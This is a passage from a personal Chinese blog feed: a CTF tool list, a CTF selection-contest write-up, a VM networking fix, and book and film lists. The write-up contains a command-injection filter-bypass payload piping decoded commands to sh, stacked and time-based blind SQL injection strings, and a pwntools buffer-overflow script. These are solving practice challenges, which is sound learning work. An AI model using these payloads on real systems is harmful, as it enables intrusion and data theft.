        <content type="html"><![CDATA[<center>做了一段时间题，感觉工具有点多，脑子记不过来 </center><span id="more"></span><h2 id="Web">Web</h2><h3 id="插件">插件</h3><ul><li>Wappalyzer</li><li>hackbar</li></ul><h3 id="其他">其他</h3><ul><li><p>Burpsuite</p></li><li><p>wireshark</p><blockquote><p>流量分析</p></blockquote></li><li></li></ul><h2 id="pwn">pwn</h2><ul><li>gdb调试</li><li>checksec</li><li>file</li><li>pwntools</li></ul><h2 id="Misc">Misc</h2><ul><li><p>feroxbuster</p><blockquote><p>暴力扫面</p></blockquote></li><li><p><a href="https://github.com/volatilityfoundation/volatility">votality</a></p><blockquote><p>内存dump</p></blockquote></li><li><p><a href="https://github.com/zed-0xff/zsteg">zestag</a></p><blockquote><p>detect stegano-hidden data in PNG &amp; BMP</p></blockquote></li><li><p><a href="https://github.com/h3xx/jphs">jphs</a></p><blockquote><p>jphide &amp; seek steganography tools</p></blockquote></li><li></li></ul><h2 id="Reverse">Reverse</h2><ul><li><p>jeb</p></li><li><p><a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstextractor</a></p><blockquote><p>PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file.</p></blockquote></li><li><p><a href="https://github.com/rocky/python-uncompyle6">uncomply</a></p><blockquote><p>A cross-version Python bytecode decompiler</p></blockquote></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> webSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tjuctf{welcome_TO_D.I.E}</title>
      <link href="/2021/08/15/2021-8-15-tjuctf%7Bwelcome_TO_D.I.E%7D/"/>
      <url>/2021/08/15/2021-8-15-tjuctf%7Bwelcome_TO_D.I.E%7D/</url>
      
        <content type="html"><![CDATA[<center>2021年D.I.E战队夏季选拔赛WP</center><center>第一次CTF</center><span id="more"></span><h2 id="Misc">Misc</h2><h3 id="find-commit">find_commit</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ git showcommit feaeda4640284b05f1975f739c661b691501be12 (HEAD -&gt; master)Author: pushinl &lt;pushinliu@gmail.com&gt;Date:   Mon Aug 2 14:42:59 2021 +0800    remove passwddiff --git a&#x2F;test1.md b&#x2F;test1.mdindex 5ce802f..86dc73f 100644--- a&#x2F;test1.md+++ b&#x2F;test1.md@@ -1,3 +1,3 @@ ###  Accounts-- Password: tjuctf&#123;cd04ebfec0e9ec32&#125;+- Password: **REMOVED**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Linked-out">Linked_out</h3><ul><li><p>搜索张伟and金属，跳到全部筛选条件，添加地点筛选“天津市”</p><blockquote><p>最开始没有就一条一条找，看到那个代码，对paste Ubuntu不敏感（当时看到群里有个张伟的访问记录，没有头像就略过了）</p></blockquote></li><li><p>看到奇怪代码<code>R72rGRhqn</code>，点进去跳转到<a href="https://paste.ubuntu.com/"><em>paste Ubuntu</em></a></p></li><li><p>随便乱输，生成后看url<code>https://paste.ubuntu.com/p/xxxxxxx/</code></p></li><li><p>访问<code>https://paste.ubuntu.com/p/vR72rGRhqn/</code></p></li></ul><h3 id="Reverse">Reverse</h3><h3 id="apk">apk</h3><ul><li><p>安装apk，得到错误信息<code>wrong</code></p><p><a href="https://imgtu.com/i/fcRvNR"><img src="https://z3.ax1x.com/2021/08/15/fcRvNR.jpg" alt="fcRvNR.jpg"></a></p></li><li><p><code>jeb</code>打开，看代码，根据错误信息找到加密函数</p></li><li><p>然后写脚本解码</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//041A051304160B091F052F3B3E1F071E2F31203B0D 两个一组，转Integer，脚本没保存</span><span class="token punctuation">&#123;</span><span class="token number">04</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedHashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collector</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Comparator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">TreeMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Counta</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//按需输入数字大小写字母，常见字符，机械复现</span>        <span class="token class-name">String</span> vo <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> vo_1 <span class="token operator">=</span> vo<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> v1<span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Character</span><span class="token punctuation">,</span> <span class="token class-name">Byte</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> v1<span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>v1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            vo_1<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>vo_1<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">,</span> vo_1<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//output</span><span class="token punctuation">&#123;</span>a<span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">19</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> e<span class="token operator">=</span><span class="token number">21</span><span class="token punctuation">,</span> f<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> g<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">,</span> h<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span> i<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> j<span class="token operator">=</span><span class="token number">26</span><span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">,</span> l<span class="token operator">=</span><span class="token number">28</span><span class="token punctuation">,</span> m<span class="token operator">=</span><span class="token number">29</span><span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> o<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">,</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> q<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> t<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> u<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> v<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> w<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> z<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token class-name">A</span><span class="token operator">=</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token class-name">B</span><span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token class-name">C</span><span class="token operator">=</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token class-name">D</span><span class="token operator">=</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token class-name">F</span><span class="token operator">=</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token class-name">G</span><span class="token operator">=</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token class-name">H</span><span class="token operator">=</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token class-name">I</span><span class="token operator">=</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token class-name">J</span><span class="token operator">=</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token operator">=</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token class-name">L</span><span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token class-name">M</span><span class="token operator">=</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token class-name">N</span><span class="token operator">=</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">O</span><span class="token operator">=</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token class-name">P</span><span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token class-name">Q</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token class-name">S</span><span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token class-name">V</span><span class="token operator">=</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token class-name">W</span><span class="token operator">=</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token class-name">X</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token class-name">Y</span><span class="token operator">=</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token class-name">Z</span><span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>`<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span> @<span class="token operator">=</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">!=</span><span class="token number">81</span><span class="token punctuation">,</span> #<span class="token operator">=</span><span class="token number">83</span><span class="token punctuation">,</span> $<span class="token operator">=</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token operator">%=</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">=</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token operator">*=</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token operator">+=</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token operator">-=</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token operator">==</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">~</span><span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">,</span> _<span class="token operator">=</span><span class="token number">47</span><span class="token punctuation">&#125;</span>                                      <span class="token comment">//手动对照</span>tjuctf<span class="token punctuation">&#123;</span>you_KNow_APK<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web">Web</h2><h3 id="welcome-to-CTF-world">welcome to CTF world</h3><ul><li>F12，Network，JS,刷新，<code>main.js</code></li></ul><h3 id="ping-base">ping_base</h3><ul><li>ls，没回显</li><li>url含ip</li><li>试试<code>127.0.0.1|ls -alh</code>，空格过滤</li><li><code>127.0.0.1|ls</code></li><li>搜索绕过过滤的办法<code>127.0.01|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></li></ul><p><a href="https://imgtu.com/i/fcfwWt"><img src="https://z3.ax1x.com/2021/08/15/fcfwWt.md.png" alt="fcfwWt.md.png"></a></p><ul><li><p>拿到base64，在线解码</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">PD9waHAKCSRmbGFnID0gInRqdWN0ZntZMHVfNFIzX1AxbmdfcDFOZ19QMW5HX000NXQzUn0iOwo&#x2F;Pg&#x3D;&#x3D;&lt;?php$flag &#x3D; &quot;tjuctf&#123;Y0u_4R3_P1ng_p1Ng_P1nG_M45t3R&#125;&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="sql233">sql233</h3><blockquote><p>搜索 CTF web sql 注入，了解这类题是从数据库拿到flag</p></blockquote><ul><li><p>随便输，url有个inject</p></li><li><p><code>1'</code>报错看到<code> MariaDB</code>，应该是=''的形式</p></li><li><p><code>1';show tables;</code>拿到表名</p></li><li><p><code>1';use findflag;</code>好像没啥反应</p></li><li><p>那就select，发现被ban，尝试各种绕过的方法（不同编码，注释，<code>concat</code>…）要么过滤，要么没有回显</p></li><li><p>和出题人py，得知select直接被ban，搜索select之外的查询方法</p><blockquote><p>搜索Mysql “查询” -select等等，反正搜不到</p></blockquote></li><li><p>没办法去看<a href="https://dev.mysql.com/doc/refman/8.0/en/">官方文档</a></p></li><li><p><code>a few moments later</code>搜索select，在和select同级的目录下，看到handler</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name &#123; <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">>=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">></span> &#125; <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token punctuation">`</span>findflag<span class="token punctuation">`</span> <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token punctuation">`</span>findflag<span class="token punctuation">`</span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span>tjuctf&#123;Y0u_4R3_SQl_1nJ3cT10n_M45t3R&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="web-log">web_log</h3><ul><li>改成.log，方便查看，前面对解题没啥意义，后面看到有规律的注入，</li><li>看到if（）MID（）函数，搜索函数用法，知道对应上就继续，不对应就sleep</li><li>翻到39，看到<code>%7D</code>，确认思路没问题</li><li>浏览过程中，在关键数据处，时间有偏差，不好写脚本</li></ul><pre class="line-numbers language-web-idl" data-language="web-idl"><code class="language-web-idl">手动记录的时候，看到有这种差1s的192.168.80.1 - - [01&#x2F;Mar&#x2F;2019:10:42:37 -0500] &quot;GET &#x2F;web&#x2F;admin&#x2F;sql.php?id&#x3D;-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),30,1)&#x3D;binary(&#39;x&#39;),1,sleep(3)) HTTP&#x2F;1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests&#x2F;2.21.0&quot;192.168.80.1 - - [01&#x2F;Mar&#x2F;2019:10:42:41 -0500] &quot;GET &#x2F;web&#x2F;admin&#x2F;sql.php?id&#x3D;-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),30,1)&#x3D;binary(&#39;y&#39;),1,sleep(3)) HTTP&#x2F;1.1&quot; 200 4017 &quot;-&quot; &quot;python-requests&#x2F;2.21.0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>时间不变处，记录数据</li></ul><h2 id="pwn">pwn</h2><blockquote><p>主要参照B站<a href="https://www.bilibili.com/video/BV1bK4y1j7Nr">视频</a></p></blockquote><ul><li>kali <code>file</code> <code>checksec</code></li><li><code>./pwnpwn</code></li><li>拿到一个<code>give_flag</code></li><li>跟着视频，跑到ida里面，但题目毕竟不一样，直接放弃</li><li>gdb调试，run 拿到一个<code>0x61616161</code>，<code>cyclic -l aaaa</code> 17</li><li>脚本</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'116.62.107.46'</span><span class="token punctuation">,</span><span class="token string">'7114'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&amp;give_flag = '</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment">#偏移量20是试出来的</span>shellAddr <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellAddr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>samba 共享遇到的问题</title>
      <link href="/2021/07/20/2021-07-20-samba-%E5%85%B1%E4%BA%AB%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/07/20/2021-07-20-samba-%E5%85%B1%E4%BA%AB%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<center>需要在window下访问虚拟机</center><span id="more"></span><blockquote><p>先贴大佬链接<code>https://blog.csdn.net/Wu_GuiMing/article/details/115031721</code></p></blockquote><p>但是我们需要虚拟机的IP地址，也就是en33的ip</p><ul><li><p>问题</p><p>只显示127.0.0.1</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">inet 127.0.0.1  netmask 255.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>解决</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo dhclient ens33sudo ifconfig ens33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书单记录</title>
      <link href="/2021/07/11/2021-05-02-%E4%B9%A6%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/11/2021-05-02-%E4%B9%A6%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="2021">2021</h2><ul><li>精神食粮</li><li>每个人都会死，但我总以为自己不会</li><li>加缪传</li><li>反与正·婚礼集·夏</li><li>谁，在呼唤我时：20世纪的见证文学</li><li>阴界与阳界</li><li>星之继承者  三部</li><li>我们</li><li>1984</li><li>反抗者</li><li>美丽新世界</li><li>剑来</li><li>族长的秋天</li><li>枯枝败叶</li><li>梦中的欢快葬礼和十二个异乡故事</li><li>沸腾十五年</li><li>沸腾新十年</li></ul>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>影视记录</title>
      <link href="/2021/07/11/2021-05-02-%E5%BD%B1%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/11/2021-05-02-%E5%BD%B1%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="2021">2021</h2><ul><li>起风了</li><li>数码宝贝：最后的进化</li><li>爱在三部曲</li><li>刺杀小说家</li><li>悬崖之上</li><li>新神榜：哪吒重生</li><li>正义联盟（扎导）</li><li>黑暗正义联盟：天启星战争</li><li>名侦探柯南：绯色的不存在证明</li><li>第六感</li><li>剪刀手爱德华</li><li>布达佩斯大饭店</li><li>沉默的羔羊三部曲</li><li>低俗小说</li><li>激情岁月</li><li>被嫌弃的松子的一生</li><li>小人物</li><li>侧耳倾听</li><li>无依之地</li><li>红猪</li><li>风之谷</li><li>魔女急宅送</li><li>博物馆奇妙夜</li><li>兰心大剧院</li><li>阳光灿烂的日子</li><li>Chernobyl.2021.1080p.NF.WEB-DL.DDP5.1.x264-ExKinoRay</li><li>喜剧之王</li><li>Black.Widow.2160p.DSNP.WEB-DL.DDP5.1.HDR.HEVC-EVO</li><li>菊次郎的夏天</li><li>釜山行</li><li>釜山行2</li><li>七武士</li><li>人生果实</li><li>萤火之森</li><li>借东西的小人阿莉埃蒂</li><li>功夫</li><li>无人知晓</li><li>谍影重重五部</li><li>英雄本色三部</li><li>人工智能</li><li>完美世界</li><li>About Time 2013 720p BluRay DD5.1 x264-CtrlHD</li><li>The Terminal 2004 720p BluRay DD5.1 x264-EbP</li><li>恐怖直播.2013.1080p.韩语.简繁中字￡CMCT槿年</li><li>纵横四海.1991.1080p.国粤双语.简繁中字￡CMCT轻语</li><li>Fast.and.Furious.9.The.Fast.Saga.2021.1080p.AMZN.WEB-DL.DDP5.1.H.264-FLUX</li><li>Master.Ji.Gong.2021.1080p.WEB-DL.H264.DDP5.1-TJUPT</li><li>Gattaca.1997.720p.BluRay.DD5.1.x264-HiDt</li><li>Gu.ling.jie.shao.nian.sha.ren.shi.jian.1991.720p.FLAC1.0.x264-VietHD</li><li>Hail.the.Judge.1994.720p.BluRay.x264-WiKi</li><li>Hotel Rwanda 2004 720p BluRay DD5.1 x264-EbP</li><li>I.Am.Sam.2001.720p.BluRay.DD5.1.x264-EbP</li><li>Infernal.Affairs.I-III.Package.BluRay.720P.x264.DTS-WiKi</li><li>新龙门客栈</li><li>青蛇劫起</li><li>完美陌生人</li><li>《香水：一个谋杀犯的故事》</li><li>Shoplifters.2018.BluRay.720p.x264.DTS-HDChina</li><li>SILENT.HILL.2006.BluRay.1080p.2Audio.DTS-HD.MA.5.1.x264-beAst</li><li>Singin.In.The.Rain.1952.720p.BluRay.DD5.1.X264-DON</li><li>Slumdog.Millionaire.2008.720p.BluRay.DD5.1.x264-DON</li><li>Spotlight.2015.720p.BluRay.x264-WiKi</li><li>The.Battle.Roar.to.Victory.2019.720p.BluRay.x264-WiKi</li><li>The.Bucket.List.2007.720p.BluRay.DD5.1.x264-HDMaNiAcS</li></ul><h3 id="剧集">剧集</h3><ul><li><p>[bilibili&amp;观察者网]沈逸：白宫里的主角们</p><blockquote><p>“霸权无限好，只是近黄昏”</p></blockquote><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>里根</mtext><mo>→</mo><mtext>老布什</mtext><mo>→</mo><mtext>克林顿</mtext><mo>→</mo><mtext>小布什</mtext><mo>→</mo><mtext>奥巴马</mtext><mo>→</mo><mi>T</mi><mi>r</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo>→</mo><mtext>拜登</mtext></mrow><annotation encoding="application/x-tex">里根\rightarrow 老布什\rightarrow 克林顿 \rightarrow 小布什 \rightarrow 奥巴马 \rightarrow Trump \rightarrow 拜登</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">里根</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">老布什</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">克林顿</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">小布什</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">奥巴马</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;"></span><span class="mord cjk_fallback">拜登</span></span></span></span></p></li><li><p>百年酒馆</p></li><li><p>过把瘾</p></li><li><p>The newsroom 三季</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> movie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Groovy脚本生成带注释的实体类</title>
      <link href="/2021/07/11/2021-07-11-Groovy%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90%E5%B8%A6%E6%B3%A8%E9%87%8A%E7%9A%84%E5%AE%9E%E4%BD%93%E7%B1%BB/"/>
